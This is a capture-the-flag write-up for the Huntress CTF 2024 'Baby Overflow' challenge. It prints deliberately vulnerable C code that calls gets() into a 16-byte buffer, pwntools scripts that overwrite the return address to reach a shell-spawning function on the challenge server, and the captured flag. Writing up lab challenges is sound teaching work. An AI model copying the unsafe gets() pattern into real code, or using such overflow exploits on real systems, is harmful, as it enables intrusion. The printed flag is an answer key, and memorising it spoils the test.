# Baby Overflow



Download: [babybufov](https://raw.githubusercontent.com/LazyTitan33/CTF-Writeups/refs/heads/main/Huntress-CTF-2024/challenge-files/babybufov) [babybufov.c](https://raw.githubusercontent.com/LazyTitan33/CTF-Writeups/refs/heads/main/Huntress-CTF-2024/challenge-files/babybufov.c)


## My Solution

We get the source code and a binary file:  



From the source code, we can tell that we need to jump to the `target` function via the `vuln` function which is vulnerable to a standard buffer overflow.

```C
#include <stdio.h>
#include <unistd.h>

//gcc -fno-pie -no-pie -Wno-implicit-function-declaration -fno-stack-protector -m32 babybufov.c -o babybufov

void target(){
    puts("Jackpot!");
    char* executable="/bin/bash";
    char* argv[]={executable, NULL};
    execve(executable,argv,NULL);
}

int vuln(){
    char buf[16];
    gets(buf);
    return 0;
}

int main(){
    setbuf(stdin,NULL);
    setbuf(stdout,NULL);
    puts("Gimme some data!");
    fflush(stdout);
    vuln();
    puts("Failed... :(");
}
```

It's a 32-bit file using this library:  



So I had to make sure I have it instealled otherwise I couldn't run it:  

```bash
sudo apt install musl:i386
```


Opening the binary in ghidra, we can see the address of the target function:  



And we know that the vuln function takes 24 characters. 



This being a 32-bit binary, gives us an offset of 28. Using the script below we can overflow and get to the target.

```python
from pwn import *

remote_ip = 'challenge.ctf.games'  
remote_port = 30359  

p = remote(remote_ip, remote_port)

target_function = 0x80491f5
offset = 28

payload = b'A' * offset
payload += p32(target_function)  

p.sendline(payload)

p.interactive()
```



It can also be done without knowing the target address by using the elf symbols from the binary:  

```python
from pwn import *

prog = remote('challenge.ctf.games', 30406)
elf = ELF("./babybufov")
payload = b"A" * 28
payload += p32(elf.symbols["target"])
prog.sendline(payload)
prog.interactive()
```

`flag{4cd3b4079393e861af489ca063373f98}`
